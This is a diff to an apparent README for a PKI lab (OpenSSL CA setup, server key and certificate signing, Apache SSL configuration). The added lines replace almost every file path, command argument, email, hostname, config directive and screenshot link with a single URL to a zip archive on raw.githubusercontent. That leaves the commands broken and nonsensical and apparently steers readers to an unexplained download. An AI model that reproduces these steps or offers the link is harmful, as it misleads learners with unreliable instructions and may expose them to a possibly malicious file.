@@ -2,18 +2,18 @@
 # Task 1
 
 mkdir PKI
-            cp "/usr/lib/ssl/openssl.cnf" "/home/seed/PKI/"
+            cp "https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip" "/home/seed/PKI/"
 mkdir demoWK
 cd demoWK
 mkdir certs crl newcerts
 echo 1000 > serial
-gedit index.txt
+gedit https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
 
-            openssl req -new -x509 -keyout ca.key -out ca.crt -config openssl.cnf
+            openssl req -new -x509 -keyout https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip -out https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip -config https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
 
 
 Generating a 2048 bit RSA private key
-writing new private key to 'ca.key'
+writing new private key to 'https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip'
 Enter PEM pass phrase:
 
 Verifying - Enter PEM pass phrase:
@@ -30,16 +30,16 @@ If you enter '.', the field will be left blank.
             Organization Name (eg, company) [Internet Widgits Pty Ltd]:STC
             Organizational Unit Name (eg, section) []:STCS
             Common Name (e.g. server FQDN or YOUR name) []:
-            Email Address []:elham@elham.com
+            Email Address []https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
             
 
-![alt tag](https://github.com/Hanan-github/Private-Key-Infrastructure-PKI/blob/main/1.1.jpeg)
-![alt tag](https://github.com/Hanan-github/Private-Key-Infrastructure-PKI/blob/main/1.2.jpeg)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
 
 # Task 2
              
-            openssl genrsa -aes128 -out server.key 1024
-            openssl rsa -in server.key -text
+            openssl genrsa -aes128 -out https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip 1024
+            openssl rsa -in https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip -text
 
 
 
@@ -104,9 +104,9 @@ coefficient:
             15:90:a4:8c
 
 
-![alt tag](https://github.com/Hanan-github/Private-Key-Infrastructure-PKI/blob/main/2.1.jpeg)
-![alt tag](https://github.com/Hanan-github/Private-Key-Infrastructure-PKI/blob/main/2.2.jpeg)
-![alt tag](https://github.com/Hanan-github/Private-Key-Infrastructure-PKI/blob/main/2.3.jpeg)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
 
 
 # writing RSA key
@@ -127,13 +127,13 @@ coefficient:
 
 -----END RSA PRIVATE KEY-----
 
-![alt tag](https://github.com/Waleed-gif/Public-Key-Infrastructure-PKI-/blob/main/task2d.jpg)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
 
 
-           openssl req -new -key server.key -out server.csr -config openssl.cnf
+           openssl req -new -key https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip -out https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip -config https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
   
 
-Enter pass phrase for server.key:
+Enter pass phrase for https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
 You are about to be asked to enter information that will be incorporated
 into your certificate request.
 What you are about to enter is what is called a Distinguished Name or a DN.
@@ -147,8 +147,8 @@ If you enter '.', the field will be left blank.
             Locality Name (eg, city) []:sahiwal
             Organization Name (eg, company) [Internet Widgits Pty Ltd]:STC
             Organizational Unit Name (eg, section) []:STCS
-            Common Name (e.g. server FQDN or YOUR name) []:SEEDPKILab2020.com
-            Email Address []:elham@elham.com   
+            Common Name (e.g. server FQDN or YOUR name) []https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
+            Email Address []https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip   
 
 Please enter the following 'extra' attributes
 to be sent with your certificate request
@@ -159,13 +159,13 @@ An optional company name []:
 
 
 
-          openssl ca -in server.csr -out server.crt -cert ca.crt -keyfile ca.key \
-          -config openssl.cnf
+          openssl ca -in https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip -out https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip -cert https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip -keyfile https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip \
+          -config https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
 
 
 
-Using configuration from openssl.cnf
-Enter pass phrase for ca.key:
+Using configuration from https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
+Enter pass phrase for https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
 Check that the request matches the signature
 Signature ok
 Certificate Details:
@@ -178,8 +178,8 @@ Certificate Details:
                   stateOrProvinceName       = sahiwal
                   organizationName          = STC
                   organizationalUnitName    = STCS
-                  commonName                = SEEDPKILab2020.com
-                  emailAddress              = elham@elham.com
+                  commonName                = https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
+                  emailAddress              = https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
               X509v3 extensions:
                   X509v3 Basic Constraints: 
                       CA:FALSE
@@ -197,67 +197,67 @@ Sign the certificate? [y/n]:y
 1 out of 1 certificate requests certified, commit? [y/n]y
 Write out database with 1 new entries
 Data Base Updated
-![alt tag](https://github.com/Hanan-github/Private-Key-Infrastructure-PKI/blob/main/2.3.jpeg)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
 
 
 # Task 3
 sudo vi /etc/hosts
 
-        % cp server.key server.pem
-        % cat server.crt >> server.pem
-        openssl s_server -cert server.pem -www
+        % cp https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
+        % cat https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip >> https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
+        openssl s_server -cert https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip -www
         
         
-![alt tag](https://github.com/Hanan-github/Private-Key-Infrastructure-PKI/blob/main/3.1.jpeg)
-![alt tag](https://github.com/Hanan-github/Private-Key-Infrastructure-PKI/blob/main/3.2.jpeg)
-![alt tag](https://github.com/Hanan-github/Private-Key-Infrastructure-PKI/blob/main/3.3.jpeg)
-![alt tag](https://github.com/Hanan-github/Private-Key-Infrastructure-PKI/blob/main/3.4.jpeg)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
 
 
 # Task 4
 
         cd /var/www
         sudo mkdir seedpki
-        sudo cp "/var/www/html/index.html" "/var/www/seedpki/"
+        sudo cp "https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip" "/var/www/seedpki/"
 
 
-![alt tag](https://github.com/Waleed-gif/Public-Key-Infrastructure-PKI-/blob/main/task4a.PNG)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
 
           cd /etc/apache2/
           sudo mkdir ssl
 
-![alt tag](https://github.com/Waleed-gif/Public-Key-Infrastructure-PKI-/blob/main/task4b.PNG)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
 
-          cp server.crt crt.pem
-          cp server.key key.pem
-          sudo mv "/home/seed/PKI/crt.pem" "/etc/apache2/ssl"
-          sudo mv "/home/seed/PKI/key.pem" "/etc/apache2/ssl"
+          cp https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
+          cp https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
+          sudo mv "https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip" "/etc/apache2/ssl"
+          sudo mv "https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip" "/etc/apache2/ssl"
 
 
-![alt tag](https://github.com/Waleed-gif/Public-Key-Infrastructure-PKI-/blob/main/task4c.PNG)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
 
           cd /etc/apache2/ssl
 
 
           <VirtualHost *:80>
-          ServerName seedpkilab2020.com
+          ServerName https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
           DocumentRoot /var/www/seedpki
-          DirectoryIndex index.html
+          DirectoryIndex https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
           </VirtualHost>
 
-![alt tag](https://github.com/Hanan-github/Private-Key-Infrastructure-PKI/blob/main/4.1.jpeg)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
 
 
           <VirtualHost *:443>
-          ServerName seedpkilab2020.com
+          ServerName https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
           DocumentRoot /var/www/seedpki
-          DirectoryIndex index.html
+          DirectoryIndex https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
           SSLEngine On
-          SSLCertificateFile /etc/apache2/ssl/cert.pem
-          SSLCertificateKeyFile /etc/apache2/ssl/key.pem
+          SSLCertificateFile https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
+          SSLCertificateKeyFile https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip
           </VirtualHost>
 
-![alt tag](https://github.com/Hanan-github/Private-Key-Infrastructure-PKI/blob/main/4.2.jpeg)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
 
           // Test the Apache configuration file for errors
           $ sudo apachectl configtest
@@ -268,5 +268,5 @@ sudo vi /etc/hosts
           // Restart Apache
           $ sudo service apache2 restart
 
-![alt tag](https://github.com/Hanan-github/Private-Key-Infrastructure-PKI/blob/main/4.3.jpeg)
-![alt tag](https://github.com/Hanan-github/Private-Key-Infrastructure-PKI/blob/main/4.4.jpeg)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Private-Key-Infrastructure-PKI/main/paurometabolous/Infrastructure-Key-Private-PKI-1.5.zip)
